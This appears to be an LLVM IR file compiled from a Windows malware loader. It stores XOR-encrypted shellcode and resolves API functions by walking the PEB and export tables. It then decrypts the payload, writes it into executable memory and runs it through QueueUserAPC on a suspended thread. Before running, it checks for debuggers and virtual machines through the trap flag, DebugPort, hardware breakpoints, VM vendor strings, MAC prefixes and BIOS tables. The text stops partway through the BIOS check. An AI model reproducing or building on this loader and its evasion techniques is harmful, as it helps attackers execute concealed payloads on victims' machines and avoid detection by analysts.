; ModuleID = 'output/t2.ll'
source_filename = "llvm-link"
target datalayout = "e-m:w-p270:32:32-p271:32:32-p272:64:64-i64:64-i128:128-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-windows-gnu"

%struct._IMAGE_DOS_HEADER = type { i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, [4 x i16], i16, i16, [10 x i16], i32 }
%struct._IMAGE_NT_HEADERS64 = type { i32, %struct._IMAGE_FILE_HEADER, %struct._IMAGE_OPTIONAL_HEADER64 }
%struct._IMAGE_FILE_HEADER = type { i16, i16, i32, i32, i32, i16, i16 }
%struct._IMAGE_OPTIONAL_HEADER64 = type { i16, i8, i8, i32, i32, i32, i32, i32, i64, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i16, i16, i64, i64, i64, i64, i32, i32, [16 x %struct._IMAGE_DATA_DIRECTORY] }
%struct._IMAGE_DATA_DIRECTORY = type { i32, i32 }
%struct._IMAGE_EXPORT_DIRECTORY = type { i32, i32, i16, i16, i32, i32, i32, i32, i32, i32, i32 }
%struct._PEB = type { i8, i8, i8, i8, ptr, ptr, ptr }
%struct._PEB_LDR_DATA = type { i32, i8, ptr, %struct._LIST_ENTRY, %struct._LIST_ENTRY, %struct._LIST_ENTRY }
%struct._LIST_ENTRY = type { ptr, ptr }
%struct._LDR_DATA_TABLE_ENTRY = type { %struct._LIST_ENTRY, %struct._LIST_ENTRY, %struct._LIST_ENTRY, ptr, ptr, i32, %struct._UNICODE_STRING, %struct._UNICODE_STRING, i32, i16, i16, %struct._LIST_ENTRY, ptr, i32, i32, ptr, ptr, ptr }
%struct._UNICODE_STRING = type { i16, i16, ptr }
%struct._EXCEPTION_RECORD = type { i32, i32, ptr, ptr, i32, [15 x i64] }
%struct._CONTEXT = type { i64, i64, i64, i64, i64, i64, i32, i32, i16, i16, i16, i16, i16, i16, i32, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, i64, %union.anon, [26 x %struct._M128A], i64, i64, i64, i64, i64, i64 }
%union.anon = type { %struct._XMM_SAVE_AREA32 }
%struct._XMM_SAVE_AREA32 = type { i16, i16, i8, i8, i16, i32, i16, i16, i32, i16, i16, i32, i32, [8 x %struct._M128A], [16 x %struct._M128A], [96 x i8] }
%struct._M128A = type { i64, i64 }
%struct._IP_ADAPTER_INFO = type { ptr, i32, [260 x i8], [132 x i8], i32, [8 x i8], i32, i32, i32, ptr, %struct._IP_ADDR_STRING, %struct._IP_ADDR_STRING, %struct._IP_ADDR_STRING, i32, %struct._IP_ADDR_STRING, %struct._IP_ADDR_STRING, i64, i64 }
%struct._IP_ADDR_STRING = type { ptr, %struct.IP_ADDRESS_STRING, %struct.IP_ADDRESS_STRING, i32 }
%struct.IP_ADDRESS_STRING = type { [16 x i8] }

@shellcode = dso_local global [312 x i8] c"\841\FB\9C\89\85\87\86\92\B4yzx8+9)()/2I\AB\1F0\F2(\181\F1*a2\F3+Z5H\B30v\CD232\F3\0B*0H\BA\D4E\1B\04{VX8\BB\B1t;y\B8\98\95+;)1\F1*Y\F1:E2y\A9\1C\F9\01bs{u\FD\0Bzxy\F1\F8\F1zxy2\FD\B9\0E\1F1{\A8=\F18Y\F10a*1x\AA\9B/7I\B02\87\B0;\F3M\F20x\AC0H\BA\D48\BB\B1t;y\B8B\98\0C\8B4z6\\q?A\A8\0F\A0!>\F39^1x\AA\1E8\F1t1>\F39f1x\AA9\F2~\F01{\A88\229!$!#; 8#9#2\FB\95Z9+\85\98!;!#2\F3k\933\86\85\87$\92syzx\0C\09\1D\0BIJW\1E\14\15z!8\C04\0E\\\7F\86\AF1\BE\BBxyzx\91lxyz0\1C\16\14\16Z\1E\0B\15\15Y)\10\1C\16\14\1A\15\1C\1C[x#\92}yzx-\1F\0B\0Dz9!2I\B0;\C2<\F9.~\85\AD1K\B18\C0\88\CC\D8.\86\AF", align 16
@shellcode_len = dso_local global i32 312, align 4
@.str = private unnamed_addr constant [13 x i8] c"kernel32.dll\00", align 1
@enc_len = dso_local global i64 312, align 8
@key = dso_local global [4 x i8] c"xyz\00", align 1
@SleepEx_ptr = dso_local global ptr null, align 8
@VirtualAlloc_ptr = dso_local global ptr null, align 8
@memcpy_ptr = dso_local global ptr null, align 8
@VirtualProtect_ptr = dso_local global ptr null, align 8
@QueueUserAPC_ptr = dso_local global ptr null, align 8
@kernel32baseAddr = dso_local global ptr null, align 8
@.str.1 = private unnamed_addr constant [15 x i8] c"GetProcAddress\00", align 1
@ptrGetProcAddress = dso_local global ptr null, align 8
@.str.2 = private unnamed_addr constant [13 x i8] c"LoadLibraryA\00", align 1
@ptrLoadLibraryA = dso_local global ptr null, align 8
@.str.3 = private unnamed_addr constant [21 x i8] c"msvcr120_clr0400.dll\00", align 1
@msvcr120_clr0400_mod = dso_local global ptr null, align 8
@kernel32_mod = dso_local global ptr null, align 8
@.str.4 = private unnamed_addr constant [7 x i8] c"memcpy\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"CloseHandle\00", align 1
@CloseHandle_ptr = dso_local global ptr null, align 8
@.str.6 = private unnamed_addr constant [15 x i8] c"VirtualProtect\00", align 1
@.str.7 = private unnamed_addr constant [20 x i8] c"WaitForSingleObject\00", align 1
@WaitForSingleObject_ptr = dso_local global ptr null, align 8
@.str.8 = private unnamed_addr constant [8 x i8] c"SleepEx\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"ResumeThread\00", align 1
@ResumeThread_ptr = dso_local global ptr null, align 8
@.str.10 = private unnamed_addr constant [7 x i8] c"printf\00", align 1
@printf_ptr = dso_local global ptr null, align 8
@.str.11 = private unnamed_addr constant [13 x i8] c"QueueUserAPC\00", align 1
@.str.12 = private unnamed_addr constant [13 x i8] c"VirtualAlloc\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"CreateThread\00", align 1
@CreateThread_ptr = dso_local global ptr null, align 8
@.str.14 = private unnamed_addr constant [18 x i8] c"didn't queue APC\0A\00", align 1
@debuggerDetected = dso_local global i32 1, align 4
@.str.15 = private unnamed_addr constant [7 x i8] c"VMware\00", align 1
@.str.1.16 = private unnamed_addr constant [11 x i8] c"VirtualBox\00", align 1
@.str.2.17 = private unnamed_addr constant [5 x i8] c"QEMU\00", align 1
@.str.3.18 = private unnamed_addr constant [4 x i8] c"Xen\00", align 1
@.str.4.19 = private unnamed_addr constant [8 x i8] c"Hyper-V\00", align 1
@.str.5.20 = private unnamed_addr constant [13 x i8] c"iphlpapi.dll\00", align 1
@.str.6.21 = private unnamed_addr constant [16 x i8] c"GetAdaptersInfo\00", align 1
@.str.7.22 = private unnamed_addr constant [44 x i8] c"GetAdaptersInfo failed to get buffer size.\0A\00", align 1
@.str.8.23 = private unnamed_addr constant [27 x i8] c"Memory allocation failed.\0A\00", align 1
@.str.9.24 = private unnamed_addr constant [45 x i8] c"GetAdaptersInfo failed to get adapter info.\0A\00", align 1
@.str.10.25 = private unnamed_addr constant [30 x i8] c"%02X:%02X:%02X:%02X:%02X:%02X\00", align 1
@.str.11.26 = private unnamed_addr constant [9 x i8] c"00:05:69\00", align 1
@.str.12.27 = private unnamed_addr constant [9 x i8] c"00:0C:29\00", align 1
@.str.13.28 = private unnamed_addr constant [9 x i8] c"08:00:27\00", align 1
@.str.14.29 = private unnamed_addr constant [9 x i8] c"00:50:56\00", align 1
@.str.15.30 = private unnamed_addr constant [5 x i8] c"VBox\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"KVM\00", align 1
@.str.31 = private unnamed_addr constant [10 x i8] c"ntdll.dll\00", align 1
@.str.1.32 = private unnamed_addr constant [26 x i8] c"NtQueryInformationProcess\00", align 1
@.str.2.33 = private unnamed_addr constant [32 x i8] c"Debugger detected (DebugPort)!\0A\00", align 1
@0 = private unnamed_addr constant [5 x i8] c"BYE\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local ptr @GetProcAddressKernel32(ptr noundef %0, ptr noundef %1) #0 {
  %3 = alloca ptr, align 8
  %4 = alloca ptr, align 8
  %5 = alloca ptr, align 8
  %6 = alloca ptr, align 8
  %7 = alloca ptr, align 8
  %8 = alloca ptr, align 8
  %9 = alloca ptr, align 8
  %10 = alloca ptr, align 8
  %11 = alloca ptr, align 8
  %12 = alloca i32, align 4
  %13 = alloca ptr, align 8
  store ptr %0, ptr %4, align 8
  store ptr %1, ptr %5, align 8
  %14 = load ptr, ptr %4, align 8
  store ptr %14, ptr %6, align 8
  %15 = load ptr, ptr %4, align 8
  %16 = load ptr, ptr %6, align 8
  %17 = getelementptr inbounds %struct._IMAGE_DOS_HEADER, ptr %16, i32 0, i32 18
  %18 = load i32, ptr %17, align 2
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, ptr %15, i64 %19
  store ptr %20, ptr %7, align 8
  %21 = load ptr, ptr %4, align 8
  %22 = load ptr, ptr %7, align 8
  %23 = getelementptr inbounds %struct._IMAGE_NT_HEADERS64, ptr %22, i32 0, i32 2
  %24 = getelementptr inbounds %struct._IMAGE_OPTIONAL_HEADER64, ptr %23, i32 0, i32 29
  %25 = getelementptr inbounds [16 x %struct._IMAGE_DATA_DIRECTORY], ptr %24, i64 0, i64 0
  %26 = getelementptr inbounds %struct._IMAGE_DATA_DIRECTORY, ptr %25, i32 0, i32 0
  %27 = load i32, ptr %26, align 4
  %28 = zext i32 %27 to i64
  %29 = getelementptr inbounds i8, ptr %21, i64 %28
  store ptr %29, ptr %8, align 8
  %30 = load ptr, ptr %4, align 8
  %31 = load ptr, ptr %8, align 8
  %32 = getelementptr inbounds %struct._IMAGE_EXPORT_DIRECTORY, ptr %31, i32 0, i32 8
  %33 = load i32, ptr %32, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i8, ptr %30, i64 %34
  store ptr %35, ptr %9, align 8
  %36 = load ptr, ptr %4, align 8
  %37 = load ptr, ptr %8, align 8
  %38 = getelementptr inbounds %struct._IMAGE_EXPORT_DIRECTORY, ptr %37, i32 0, i32 9
  %39 = load i32, ptr %38, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds i8, ptr %36, i64 %40
  store ptr %41, ptr %10, align 8
  %42 = load ptr, ptr %4, align 8
  %43 = load ptr, ptr %8, align 8
  %44 = getelementptr inbounds %struct._IMAGE_EXPORT_DIRECTORY, ptr %43, i32 0, i32 10
  %45 = load i32, ptr %44, align 4
  %46 = zext i32 %45 to i64
  %47 = getelementptr inbounds i8, ptr %42, i64 %46
  store ptr %47, ptr %11, align 8
  store i32 0, ptr %12, align 4
  br label %48

48:                                               ; preds = %81, %2
  %49 = load i32, ptr %12, align 4
  %50 = load ptr, ptr %8, align 8
  %51 = getelementptr inbounds %struct._IMAGE_EXPORT_DIRECTORY, ptr %50, i32 0, i32 7
  %52 = load i32, ptr %51, align 4
  %53 = icmp ult i32 %49, %52
  br i1 %53, label %54, label %84

54:                                               ; preds = %48
  %55 = load ptr, ptr %4, align 8
  %56 = load ptr, ptr %10, align 8
  %57 = load i32, ptr %12, align 4
  %58 = zext i32 %57 to i64
  %59 = getelementptr inbounds i32, ptr %56, i64 %58
  %60 = load i32, ptr %59, align 4
  %61 = zext i32 %60 to i64
  %62 = getelementptr inbounds i8, ptr %55, i64 %61
  store ptr %62, ptr %13, align 8
  %63 = load ptr, ptr %13, align 8
  %64 = load ptr, ptr %5, align 8
  %65 = call i32 @strcmp(ptr noundef %63, ptr noundef %64)
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %80

67:                                               ; preds = %54
  %68 = load ptr, ptr %4, align 8
  %69 = load ptr, ptr %9, align 8
  %70 = load ptr, ptr %11, align 8
  %71 = load i32, ptr %12, align 4
  %72 = zext i32 %71 to i64
  %73 = getelementptr inbounds i16, ptr %70, i64 %72
  %74 = load i16, ptr %73, align 2
  %75 = zext i16 %74 to i64
  %76 = getelementptr inbounds i32, ptr %69, i64 %75
  %77 = load i32, ptr %76, align 4
  %78 = zext i32 %77 to i64
  %79 = getelementptr inbounds i8, ptr %68, i64 %78
  store ptr %79, ptr %3, align 8
  br label %85

80:                                               ; preds = %54
  br label %81

81:                                               ; preds = %80
  %82 = load i32, ptr %12, align 4
  %83 = add i32 %82, 1
  store i32 %83, ptr %12, align 4
  br label %48, !llvm.loop !5

84:                                               ; preds = %48
  store ptr null, ptr %3, align 8
  br label %85

85:                                               ; preds = %84, %67
  %86 = load ptr, ptr %3, align 8
  ret ptr %86
}

declare dso_local i32 @strcmp(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local ptr @getkernel32baseAddr() #0 {
  %1 = alloca ptr, align 8
  %2 = alloca ptr, align 8
  %3 = alloca ptr, align 8
  %4 = alloca ptr, align 8
  %5 = alloca [256 x i8], align 16
  %6 = alloca i32, align 4
  store ptr null, ptr %4, align 8
  %7 = call ptr asm "mov %gs:0x60, $0", "=r,~{dirflag},~{fpsr},~{flags}"() #8, !srcloc !7
  store ptr %7, ptr %1, align 8
  %8 = load ptr, ptr %1, align 8
  %9 = getelementptr inbounds %struct._PEB, ptr %8, i32 0, i32 6
  %10 = load ptr, ptr %9, align 8
  %11 = getelementptr inbounds %struct._PEB_LDR_DATA, ptr %10, i32 0, i32 3
  %12 = getelementptr inbounds %struct._LIST_ENTRY, ptr %11, i32 0, i32 0
  %13 = load ptr, ptr %12, align 8
  store ptr %13, ptr %3, align 8
  br label %14

14:                                               ; preds = %64, %0
  %15 = load ptr, ptr %3, align 8
  %16 = getelementptr inbounds i8, ptr %15, i64 0
  store ptr %16, ptr %2, align 8
  store i32 0, ptr %6, align 4
  br label %17

17:                                               ; preds = %46, %14
  %18 = load i32, ptr %6, align 4
  %19 = sext i32 %18 to i64
  %20 = load ptr, ptr %2, align 8
  %21 = getelementptr inbounds %struct._LDR_DATA_TABLE_ENTRY, ptr %20, i32 0, i32 7
  %22 = getelementptr inbounds %struct._UNICODE_STRING, ptr %21, i32 0, i32 0
  %23 = load i16, ptr %22, align 8
  %24 = zext i16 %23 to i64
  %25 = udiv i64 %24, 2
  %26 = icmp ult i64 %19, %25
  br i1 %26, label %27, label %31

27:                                               ; preds = %17
  %28 = load i32, ptr %6, align 4
  %29 = sext i32 %28 to i64
  %30 = icmp ult i64 %29, 255
  br label %31

31:                                               ; preds = %27, %17
  %32 = phi i1 [ false, %17 ], [ %30, %27 ]
  br i1 %32, label %33, label %49

33:                                               ; preds = %31
  %34 = load ptr, ptr %2, align 8
  %35 = getelementptr inbounds %struct._LDR_DATA_TABLE_ENTRY, ptr %34, i32 0, i32 7
  %36 = getelementptr inbounds %struct._UNICODE_STRING, ptr %35, i32 0, i32 2
  %37 = load ptr, ptr %36, align 8
  %38 = load i32, ptr %6, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i16, ptr %37, i64 %39
  %41 = load i16, ptr %40, align 2
  %42 = trunc i16 %41 to i8
  %43 = load i32, ptr %6, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [256 x i8], ptr %5, i64 0, i64 %44
  store i8 %42, ptr %45, align 1
  br label %46

46:                                               ; preds = %33
  %47 = load i32, ptr %6, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, ptr %6, align 4
  br label %17, !llvm.loop !8

49:                                               ; preds = %31
  %50 = load i32, ptr %6, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [256 x i8], ptr %5, i64 0, i64 %51
  store i8 0, ptr %52, align 1
  %53 = getelementptr inbounds [256 x i8], ptr %5, i64 0, i64 0
  %54 = call i32 @_stricmp(ptr noundef %53, ptr noundef @.str)
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %60

56:                                               ; preds = %49
  %57 = load ptr, ptr %2, align 8
  %58 = getelementptr inbounds %struct._LDR_DATA_TABLE_ENTRY, ptr %57, i32 0, i32 3
  %59 = load ptr, ptr %58, align 8
  store ptr %59, ptr %4, align 8
  br label %60

60:                                               ; preds = %56, %49
  %61 = load ptr, ptr %3, align 8
  %62 = getelementptr inbounds %struct._LIST_ENTRY, ptr %61, i32 0, i32 0
  %63 = load ptr, ptr %62, align 8
  store ptr %63, ptr %3, align 8
  br label %64

64:                                               ; preds = %60
  %65 = load ptr, ptr %3, align 8
  %66 = load ptr, ptr %1, align 8
  %67 = getelementptr inbounds %struct._PEB, ptr %66, i32 0, i32 6
  %68 = load ptr, ptr %67, align 8
  %69 = getelementptr inbounds %struct._PEB_LDR_DATA, ptr %68, i32 0, i32 3
  %70 = icmp ne ptr %65, %69
  br i1 %70, label %14, label %71, !llvm.loop !9

71:                                               ; preds = %64
  %72 = load ptr, ptr %4, align 8
  ret ptr %72
}

declare dllimport i32 @_stricmp(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @AlterableFunction2() #0 {
  %1 = load ptr, ptr @SleepEx_ptr, align 8
  %2 = call i32 %1(i32 noundef -1, i32 noundef 1)
  ret i32 0
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @xor_decrypt(ptr noundef %0, i64 noundef %1, ptr noundef %2) #0 {
  %4 = alloca ptr, align 8
  %5 = alloca i64, align 8
  %6 = alloca ptr, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  store ptr %0, ptr %4, align 8
  store i64 %1, ptr %5, align 8
  store ptr %2, ptr %6, align 8
  %9 = load ptr, ptr %6, align 8
  %10 = call i64 @strlen(ptr noundef %9)
  store i64 %10, ptr %7, align 8
  store i64 0, ptr %8, align 8
  br label %11

11:                                               ; preds = %30, %3
  %12 = load i64, ptr %8, align 8
  %13 = load i64, ptr %5, align 8
  %14 = icmp ult i64 %12, %13
  br i1 %14, label %15, label %33

15:                                               ; preds = %11
  %16 = load ptr, ptr %6, align 8
  %17 = load i64, ptr %8, align 8
  %18 = load i64, ptr %7, align 8
  %19 = urem i64 %17, %18
  %20 = getelementptr inbounds i8, ptr %16, i64 %19
  %21 = load i8, ptr %20, align 1
  %22 = sext i8 %21 to i32
  %23 = load ptr, ptr %4, align 8
  %24 = load i64, ptr %8, align 8
  %25 = getelementptr inbounds i8, ptr %23, i64 %24
  %26 = load i8, ptr %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %22
  %29 = trunc i32 %28 to i8
  store i8 %29, ptr %25, align 1
  br label %30

30:                                               ; preds = %15
  %31 = load i64, ptr %8, align 8
  %32 = add i64 %31, 1
  store i64 %32, ptr %8, align 8
  br label %11, !llvm.loop !10

33:                                               ; preds = %11
  ret void
}

declare dso_local i64 @strlen(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @gogogo(ptr noundef %0, ptr noundef %1, i64 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca ptr, align 8
  %6 = alloca ptr, align 8
  %7 = alloca i64, align 8
  %8 = alloca ptr, align 8
  %9 = alloca i32, align 4
  store ptr %0, ptr %5, align 8
  store ptr %1, ptr %6, align 8
  store i64 %2, ptr %7, align 8
  store ptr null, ptr %8, align 8
  store i32 0, ptr %9, align 4
  %10 = load ptr, ptr @VirtualAlloc_ptr, align 8
  %11 = load i64, ptr %7, align 8
  %12 = call ptr %10(ptr noundef null, i64 noundef %11, i32 noundef 12288, i32 noundef 4)
  store ptr %12, ptr %8, align 8
  %13 = load ptr, ptr %8, align 8
  %14 = icmp eq ptr %13, null
  br i1 %14, label %15, label %16

15:                                               ; preds = %3
  store i32 0, ptr %4, align 4
  br label %36

16:                                               ; preds = %3
  %17 = load ptr, ptr @memcpy_ptr, align 8
  %18 = load ptr, ptr %8, align 8
  %19 = load ptr, ptr %6, align 8
  %20 = load i64, ptr %7, align 8
  %21 = call ptr %17(ptr noundef %18, ptr noundef %19, i64 noundef %20)
  %22 = load ptr, ptr @VirtualProtect_ptr, align 8
  %23 = load ptr, ptr %8, align 8
  %24 = load i64, ptr %7, align 8
  %25 = call i32 %22(ptr noundef %23, i64 noundef %24, i32 noundef 64, ptr noundef %9)
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %28, label %27

27:                                               ; preds = %16
  store i32 0, ptr %4, align 4
  br label %36

28:                                               ; preds = %16
  %29 = load ptr, ptr @QueueUserAPC_ptr, align 8
  %30 = load ptr, ptr %8, align 8
  %31 = load ptr, ptr %5, align 8
  %32 = call i32 %29(ptr noundef %30, ptr noundef %31, i64 noundef 0)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %35, label %34

34:                                               ; preds = %28
  store i32 0, ptr %4, align 4
  br label %36

35:                                               ; preds = %28
  store i32 1, ptr %4, align 4
  br label %36

36:                                               ; preds = %35, %34, %27, %15
  %37 = load i32, ptr %4, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = call i32 @debuggerCheckAPI()
  %2 = call i32 @checkDebugPort()
  %3 = call i32 @checkDebugObjectHandle()
  %4 = call i32 @PEBFlagsCheck()
  %5 = call i32 @hardwareBreakpoints()
  %6 = call i32 @antiVirtualizationCheck()
  %7 = call i32 @CheckBIOSforVM()
  %8 = call i32 @HasVMMacAddress()
  %9 = call i32 @trapFlags()
  %10 = or i32 %1, %2
  %11 = or i32 %10, %3
  %12 = or i32 %11, %4
  %13 = or i32 %12, %5
  %14 = or i32 %13, %6
  %15 = or i32 %14, %7
  %16 = or i32 %15, %8
  %17 = or i32 %16, %9
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %exit, label %original

original:                                         ; preds = %0
  %19 = alloca i32, align 4
  %20 = alloca ptr, align 8
  store i32 0, ptr %19, align 4
  %21 = call ptr @getkernel32baseAddr()
  store ptr %21, ptr @kernel32baseAddr, align 8
  %22 = load ptr, ptr @kernel32baseAddr, align 8
  %23 = call ptr @GetProcAddressKernel32(ptr noundef %22, ptr noundef @.str.1)
  store ptr %23, ptr @ptrGetProcAddress, align 8
  %24 = load ptr, ptr @kernel32baseAddr, align 8
  %25 = call ptr @GetProcAddressKernel32(ptr noundef %24, ptr noundef @.str.2)
  store ptr %25, ptr @ptrLoadLibraryA, align 8
  %26 = load ptr, ptr @ptrLoadLibraryA, align 8
  %27 = call ptr %26(ptr noundef @.str.3)
  store ptr %27, ptr @msvcr120_clr0400_mod, align 8
  %28 = load ptr, ptr @ptrLoadLibraryA, align 8
  %29 = call ptr %28(ptr noundef @.str)
  store ptr %29, ptr @kernel32_mod, align 8
  %30 = load ptr, ptr @ptrGetProcAddress, align 8
  %31 = load ptr, ptr @msvcr120_clr0400_mod, align 8
  %32 = call ptr %30(ptr noundef %31, ptr noundef @.str.4)
  store ptr %32, ptr @memcpy_ptr, align 8
  %33 = load ptr, ptr @ptrGetProcAddress, align 8
  %34 = load ptr, ptr @kernel32_mod, align 8
  %35 = call ptr %33(ptr noundef %34, ptr noundef @.str.5)
  store ptr %35, ptr @CloseHandle_ptr, align 8
  %36 = load ptr, ptr @ptrGetProcAddress, align 8
  %37 = load ptr, ptr @kernel32_mod, align 8
  %38 = call ptr %36(ptr noundef %37, ptr noundef @.str.6)
  store ptr %38, ptr @VirtualProtect_ptr, align 8
  %39 = load ptr, ptr @ptrGetProcAddress, align 8
  %40 = load ptr, ptr @kernel32_mod, align 8
  %41 = call ptr %39(ptr noundef %40, ptr noundef @.str.7)
  store ptr %41, ptr @WaitForSingleObject_ptr, align 8
  %42 = load ptr, ptr @ptrGetProcAddress, align 8
  %43 = load ptr, ptr @kernel32_mod, align 8
  %44 = call ptr %42(ptr noundef %43, ptr noundef @.str.8)
  store ptr %44, ptr @SleepEx_ptr, align 8
  %45 = load ptr, ptr @ptrGetProcAddress, align 8
  %46 = load ptr, ptr @kernel32_mod, align 8
  %47 = call ptr %45(ptr noundef %46, ptr noundef @.str.9)
  store ptr %47, ptr @ResumeThread_ptr, align 8
  %48 = load ptr, ptr @ptrGetProcAddress, align 8
  %49 = load ptr, ptr @msvcr120_clr0400_mod, align 8
  %50 = call ptr %48(ptr noundef %49, ptr noundef @.str.10)
  store ptr %50, ptr @printf_ptr, align 8
  %51 = load ptr, ptr @ptrGetProcAddress, align 8
  %52 = load ptr, ptr @kernel32_mod, align 8
  %53 = call ptr %51(ptr noundef %52, ptr noundef @.str.11)
  store ptr %53, ptr @QueueUserAPC_ptr, align 8
  %54 = load ptr, ptr @ptrGetProcAddress, align 8
  %55 = load ptr, ptr @kernel32_mod, align 8
  %56 = call ptr %54(ptr noundef %55, ptr noundef @.str.12)
  store ptr %56, ptr @VirtualAlloc_ptr, align 8
  %57 = load ptr, ptr @ptrGetProcAddress, align 8
  %58 = load ptr, ptr @kernel32_mod, align 8
  %59 = call ptr %57(ptr noundef %58, ptr noundef @.str.13)
  store ptr %59, ptr @CreateThread_ptr, align 8
  %60 = load ptr, ptr @CreateThread_ptr, align 8
  %61 = call ptr %60(ptr noundef null, i64 noundef 0, ptr noundef @AlterableFunction2, ptr noundef null, i32 noundef 4, ptr noundef null)
  store ptr %61, ptr %20, align 8
  %62 = load ptr, ptr %20, align 8
  %63 = icmp ne ptr %62, null
  br i1 %63, label %65, label %64

64:                                               ; preds = %original
  store i32 1, ptr %19, align 4
  br label %82

65:                                               ; preds = %original
  call void @xor_decrypt(ptr noundef @shellcode, i64 noundef 312, ptr noundef @key)
  %66 = load ptr, ptr %20, align 8
  %67 = call i32 @gogogo(ptr noundef %66, ptr noundef @shellcode, i64 noundef 312)
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %72, label %69

69:                                               ; preds = %65
  %70 = load ptr, ptr @printf_ptr, align 8
  %71 = call i32 %70(ptr noundef @.str.14)
  br label %72

72:                                               ; preds = %69, %65
  %73 = load ptr, ptr @ResumeThread_ptr, align 8
  %74 = load ptr, ptr %20, align 8
  %75 = call i32 %73(ptr noundef %74)
  %76 = load ptr, ptr @WaitForSingleObject_ptr, align 8
  %77 = load ptr, ptr %20, align 8
  %78 = call i32 %76(ptr noundef %77, i32 noundef -1)
  %79 = load ptr, ptr @CloseHandle_ptr, align 8
  %80 = load ptr, ptr %20, align 8
  %81 = call i32 %79(ptr noundef %80)
  store i32 0, ptr %19, align 4
  br label %82

82:                                               ; preds = %72, %64
  %83 = load i32, ptr %19, align 4
  ret i32 %83

exit:                                             ; preds = %0
  %84 = call i32 (ptr, ...) @printf(ptr @0)
  ret i32 0
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @VectoredHandler(ptr noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca ptr, align 8
  store ptr %0, ptr %3, align 8
  %4 = load ptr, ptr %3, align 8
  %5 = getelementptr inbounds %struct._LIST_ENTRY, ptr %4, i32 0, i32 0
  %6 = load ptr, ptr %5, align 8
  %7 = getelementptr inbounds %struct._EXCEPTION_RECORD, ptr %6, i32 0, i32 0
  %8 = load i32, ptr %7, align 8
  %9 = icmp eq i32 %8, -2147483644
  br i1 %9, label %10, label %17

10:                                               ; preds = %1
  store volatile i32 0, ptr @debuggerDetected, align 4
  %11 = load ptr, ptr %3, align 8
  %12 = getelementptr inbounds %struct._LIST_ENTRY, ptr %11, i32 0, i32 1
  %13 = load ptr, ptr %12, align 8
  %14 = getelementptr inbounds %struct._CONTEXT, ptr %13, i32 0, i32 37
  %15 = load i64, ptr %14, align 8
  %16 = add i64 %15, 1
  store i64 %16, ptr %14, align 8
  store i32 -1, ptr %2, align 4
  br label %18

17:                                               ; preds = %1
  store i32 0, ptr %2, align 4
  br label %18

18:                                               ; preds = %17, %10
  %19 = load i32, ptr %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @trapFlags() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i32, align 4
  %3 = alloca ptr, align 8
  %4 = call ptr @AddVectoredExceptionHandler(i32 noundef 1, ptr noundef @VectoredHandler)
  store ptr %4, ptr %3, align 8
  %5 = load ptr, ptr %3, align 8
  %6 = icmp ne ptr %5, null
  br i1 %6, label %8, label %7

7:                                                ; preds = %0
  store i32 -1, ptr %2, align 4
  br label %18

8:                                                ; preds = %0
  %9 = call i64 @llvm.x86.flags.read.u64()
  %10 = or i64 %9, 256
  store i64 %10, ptr %1, align 8
  %11 = load i64, ptr %1, align 8
  call void @llvm.x86.flags.write.u64(i64 %11)
  call void asm sideeffect "nop", "~{dirflag},~{fpsr},~{flags}"() #2, !srcloc !11
  %12 = load ptr, ptr %3, align 8
  %13 = call i32 @RemoveVectoredExceptionHandler(ptr noundef %12)
  %14 = load volatile i32, ptr @debuggerDetected, align 4
  %15 = icmp ne i32 %14, 0
  %16 = zext i1 %15 to i64
  %17 = select i1 %15, i32 1, i32 0
  store i32 %17, ptr %2, align 4
  br label %18

18:                                               ; preds = %8, %7
  %19 = load i32, ptr %2, align 4
  ret i32 %19
}

declare dllimport ptr @AddVectoredExceptionHandler(i32 noundef, ptr noundef) #1

; Function Attrs: nounwind
declare i64 @llvm.x86.flags.read.u64() #2

; Function Attrs: nounwind
declare void @llvm.x86.flags.write.u64(i64) #2

declare dllimport i32 @RemoveVectoredExceptionHandler(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @CheckBIOSforVM() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca ptr, align 8
  %4 = alloca i8, align 1
  %5 = alloca i32, align 4
  %6 = call i32 @GetSystemFirmwareTable(i32 noundef 1381190978, i32 noundef 0, ptr noundef null, i32 noundef 0)
  store i32 %6, ptr %2, align 4
  %7 = load i32, ptr %2, align 4
  %8 = icmp eq i32 %7, 0
  br i1 %8, label %9, label %10

9:                                                ; preds = %0
  store i32 0, ptr %1, align 4
  br label %75

